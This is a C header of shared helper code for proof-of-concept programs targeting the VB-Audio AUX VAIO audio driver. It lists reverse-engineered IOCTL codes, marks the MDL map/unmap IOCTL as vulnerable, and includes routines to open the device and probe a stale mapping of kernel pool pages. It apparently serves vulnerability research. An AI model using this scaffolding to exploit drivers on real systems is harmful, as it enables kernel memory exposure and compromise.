/*
 * device.h — shared code for opening the VB-Audio AUX VAIO device
 *
 * Used by all PoC programs. Provides:
 *   openDevice()  — find and open the device by hardware ID
 *   sendIoctl()   — send a synchronous IOCTL request
 *   canReadByte() — safely check if a byte is readable (no crash on unmapped pages)
 *   IOCTL constants — control codes from the driver's dispatch handler
 */

#ifndef DEVICE_H
#define DEVICE_H

#include <windows.h>
#include <setupapi.h>
#include <stdio.h>


/* ---- IOCTL codes from FUN_00013f2c (KS property handler, RVA 0x13f2c) ---- */

#define IOCTL_FORMAT_INFO    0x222024   /* read format descriptor (out >= 112 bytes) */
#define IOCTL_FORMAT_CONST   0x222040   /* read format constant  (out >=  4 bytes)  */
#define IOCTL_MDL_MAP        0x222044   /* map/unmap kernel buffers — vulnerable    */
#define IOCTL_SAMPLE_RATE    0x222048   /* set sample rate (4 bytes in/out)          */
#define IOCTL_LATENCY        0x22204C   /* set buffer latency (4 bytes in/out)       */
#define IOCTL_ENABLE         0x222010   /* toggle enabled state (4 bytes in/out)     */


/*
 * openDevice — find and open the AUX VAIO device by its hardware ID.
 *
 * The device is identified by its hardware ID "VBAudioVMAUXVAIO",
 * which is the string the driver itself uses (confirmed at FUN_0001369c).
 *
 * Returns a device handle, or INVALID_HANDLE_VALUE on failure.
 * The caller must call CloseHandle() when done.
 */
static HANDLE openDevice(void) {
    GUID ksAudio = {
        0x6994AD04, 0x93EF, 0x11D0,
        { 0xA3, 0xCC, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96 }
    };

    HDEVINFO devList = SetupDiGetClassDevsW(
        &ksAudio, NULL, NULL,
        DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);

    if (devList == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA ifd;
    ifd.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    for (DWORD index = 0;
         SetupDiEnumDeviceInterfaces(devList, NULL, &ksAudio, index, &ifd);
         index++) {

        // Step 1 — get the required buffer size
        DWORD sizeNeeded = 0;
        SetupDiGetDeviceInterfaceDetailW(
            devList, &ifd, NULL, 0, &sizeNeeded, NULL);

        // Step 2 — allocate and fill the buffer
        BYTE *buffer = (BYTE *)malloc(sizeNeeded + 512);

        if (buffer == NULL) {
            continue;
        }

        PSP_DEVICE_INTERFACE_DETAIL_DATA_W detail =
            (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)buffer;
        detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
        SP_DEVINFO_DATA diData = { sizeof(SP_DEVINFO_DATA) };

        if (!SetupDiGetDeviceInterfaceDetailW(
                devList, &ifd, detail, sizeNeeded + 512, NULL, &diData)) {
            free(buffer);
            continue;
        }

        // Step 3 — check the hardware ID
        WCHAR hardwareId[256] = {0};
        SetupDiGetDeviceRegistryPropertyW(
            devList, &diData, SPDRP_HARDWAREID,
            NULL, (PBYTE)hardwareId, sizeof(hardwareId), NULL);

        // "VBAudioVMAUXVAIO" is the driver's own device identifier
        int isTarget = (wcsstr(hardwareId, L"VBAudioVMAUXVAIO") != NULL);

        if (!isTarget) {
            free(buffer);
            continue;
        }

        // Step 4 — open the matching device
        HANDLE handle = CreateFileW(
            detail->DevicePath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            NULL);

        if (handle != INVALID_HANDLE_VALUE) {
            wprintf(L"[open] %s\n", detail->DevicePath);
            wprintf(L"[open] hwid: %s\n", hardwareId);
        }

        free(buffer);
        SetupDiDestroyDeviceInfoList(devList);
        return handle;
    }

    // No matching device found
    SetupDiDestroyDeviceInfoList(devList);
    return INVALID_HANDLE_VALUE;
}


/*
 * sendIoctl — send a synchronous IOCTL request to the device.
 *
 * Returns TRUE on success, FALSE on failure (call GetLastError()).
 * On success, *bytesReturned is set to the number of output bytes.
 */
static BOOL sendIoctl(
    HANDLE device, DWORD controlCode,
    void *input,  DWORD inputSize,
    void *output, DWORD outputSize,
    DWORD *bytesReturned)
{
    OVERLAPPED overlapped = {0};

    overlapped.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    if (overlapped.hEvent == NULL) {
        return FALSE;
    }

    BOOL ok = DeviceIoControl(
        device, controlCode,
        input, inputSize,
        output, outputSize,
        bytesReturned, &overlapped);

    // If the driver hasn't finished yet, wait for it
    int isPending = (!ok && GetLastError() == ERROR_IO_PENDING);

    if (isPending) {
        ok = GetOverlappedResult(device, &overlapped, bytesReturned, TRUE);
    }

    CloseHandle(overlapped.hEvent);
    return ok;
}


/*
 * canReadByte — safely check if a byte at the given address is readable.
 *
 * Uses VirtualQuery to avoid page faults on unmapped or guarded pages.
 * This is needed because our stale mapping covers kernel pool pages
 * that may have been freed or remapped by the OS.
 *
 * Returns TRUE and fills *value if the byte is readable.
 */
static BOOL canReadByte(const void *address, BYTE *value) {
    MEMORY_BASIC_INFORMATION memInfo;

    if (VirtualQuery(address, &memInfo, sizeof(memInfo)) == 0) {
        return FALSE;
    }

    int isCommitted = (memInfo.State == MEM_COMMIT);
    int isBlocked   = (memInfo.Protect & (PAGE_NOACCESS | PAGE_GUARD)) != 0;

    if (!isCommitted || isBlocked) {
        return FALSE;
    }

    // VolatileLoad — prevent the compiler from optimising away the read
    *value = *(volatile BYTE *)address;
    return TRUE;
}

#endif // DEVICE_H

